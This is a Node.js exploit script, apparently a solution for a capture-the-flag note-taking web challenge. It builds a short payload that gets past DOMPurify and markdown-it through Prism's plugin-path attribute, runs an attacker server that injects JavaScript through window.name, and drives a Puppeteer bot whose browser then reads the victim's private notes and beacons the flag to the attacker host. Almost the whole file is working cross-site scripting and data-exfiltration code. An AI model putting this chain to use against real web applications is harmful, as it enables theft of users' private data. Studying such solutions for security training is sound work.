const path = require("path");
const http = require("http");
const puppeteer = require(path.resolve(__dirname, "../challenge_mouse/bot/node_modules/puppeteer-core"));

const APP = "http://127.0.0.1:3000";
const ATK = "http://127.0.0.1:8000";
const CHROME = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

// ---------- 1. payload (<= 80 chars) ----------
const body = "<a data-prism-plugins data-prism-plugin-path=data:text/javascript,import(name)#>";
if (body.length > 80) { console.error("PAYLOAD TOO LONG:", body.length); process.exit(1); }
console.log("[*] payload len:", body.length, body);

// Sanitize check server-side equivalent
const { JSDOM } = require(path.resolve(__dirname, "../challenge_mouse/app/node_modules/jsdom"));
const MarkdownIt = require(path.resolve(__dirname, "../challenge_mouse/app/node_modules/markdown-it"));
const DOMPurify = require(path.resolve(__dirname, "../challenge_mouse/app/node_modules/dompurify"))(new JSDOM("").window);
const md = new MarkdownIt({ html: true, linkify: false });
const rendered = DOMPurify.sanitize(md.render(body));
console.log("[*] sanitized:", JSON.stringify(rendered));
const dd = new JSDOM(rendered).window.document;
if (!dd.querySelector("[data-prism-plugins]") || !dd.querySelector("[data-prism-plugin-path]")) {
  console.error("[-] payload attrs did not survive sanitize"); process.exit(1);
}
console.log("[+] payload survives DOMPurify+markdown-it");

// ---------- 2. attacker + beacon server ----------
const FULLCODE = `
const o=location.origin,B='//127.0.0.1:8000/b';
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const b=(t)=>new Promise(r=>{try{const f=document.createElement('iframe');f.src=o+'/notes?search=';f.onload=()=>{try{f.contentWindow.fetch(B+'/'+encodeURIComponent(t),{mode:'no-cors'}).catch(()=>{})}catch(e){};r()};document.body.appendChild(f);setTimeout(r,3000)}catch(e){r()}});
const grab=u=>new Promise(r=>{const f=document.createElement('iframe');f.src=u;f.onload=()=>{r(f.contentDocument)};document.body.appendChild(f);setTimeout(()=>r(null),4000)});
(async()=>{
try{
 await b('start');
 const d=await grab(o+'/notes?search=');
 if(!d){await b('nolist');return}
 const ids=[...d.querySelectorAll('li a')].map(a=>a.textContent.trim());
 await b('list:'+ids.length);
 for(const id of ids){
  try{
   const n=await grab(o+'/notes/'+id);
   if(!n)continue;
   const h=n.querySelector('h1');
   if(h&&h.textContent.trim()==='flag draft'){
    const flag=(n.querySelector('main')||{}).textContent.trim();
    await b('GOT:'+flag);
    await b('done');
    return;
   }
  }catch(e){}
 }
 await b('notfound');
}catch(e){await b('ERR:'+e.message)}
})();
`.trim();

const hits = [];
const server = http.createServer((req, res) => {
  const url = req.url;
  hits.push(url);
  console.log("[BEACON]", req.method, url);
  if (url.startsWith("/atk")) {
    res.setHeader("Content-Type", "text/html");
    const data = "data:text/javascript," + encodeURIComponent(FULLCODE);
    const nid = decodeURIComponent((url.split("?n=")[1] || "").split("&")[0]);
    res.end(`<!doctype html><html><body>
<script>
window.name=${JSON.stringify(data)};
location.href="${APP}/notes/${nid}";
</script></body></html>`);
    return;
  }
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.end("OK\n");
});

server.listen(8000, async () => {
  // ---------- 3. create the note ----------
  const postData = "title=hi&body=" + encodeURIComponent(body);
  const noteId = await new Promise((resolve, reject) => {
    const req = http.request(APP + "/notes", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": Buffer.byteLength(postData),
        "Sec-Fetch-Mode": "navigate"
      }
    }, res => {
      const loc = res.headers.location || "";
      resolve(loc.split("/").pop());
    });
    req.on("error", reject);
    req.write(postData);
    req.end();
  });
  console.log("[+] note created:", noteId);

  // ---------- 4. emulate bot ----------
  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: CHROME,
    args: ["--no-sandbox", "--disable-dev-shm-usage", "--js-flags=--jitless", "--no-default-browser-check"]
  });
  const page = await browser.newPage();
  page.on("console", msg => console.log("[CONSOLE]", msg.text()));
  page.on("requestfailed", r => console.log("[REQFAIL]", r.url(), r.failure() && r.failure().errorText));
  page.on("response", r => { if (r.url().includes("/notes")) console.log("[RESP]", r.status(), r.url()); });

  await page.setRequestInterception(true);
  page.on("request", request => {
    const externalNavigation = page.url().startsWith(`${APP}/notes/`)
      && request.isNavigationRequest()
      && request.frame() === page.mainFrame()
      && new URL(request.url()).origin !== APP;
    externalNavigation ? request.abort() : request.continue();
  });

  await page.setExtraHTTPHeaders({ "X-Bot-Token": "bot-token" });
  const sessionResponse = await page.goto(`${APP}/bot/session`, { timeout: 5000, waitUntil: "domcontentloaded" });
  await page.setExtraHTTPHeaders({});
  console.log("[*] bot session:", sessionResponse.status(), "->", sessionResponse.url());

  const atkUrl = ATK + "/atk?n=" + noteId;
  console.log("[*] bot visiting:", atkUrl);
  await page.goto(atkUrl, { timeout: 5000, waitUntil: "domcontentloaded" });
  console.log("[*] waiting for chain...");

  await new Promise(r => setTimeout(r, 25000));
  console.log("[*] hits:", JSON.stringify(hits));
  const got = hits.find(h => h.includes("GOT:"));
  if (got) console.log("\n[FLAG-LOCAL]", decodeURIComponent(got.split("GOT:").pop()));
  await browser.close();
  server.close();
  process.exit(got ? 0 : 1);
});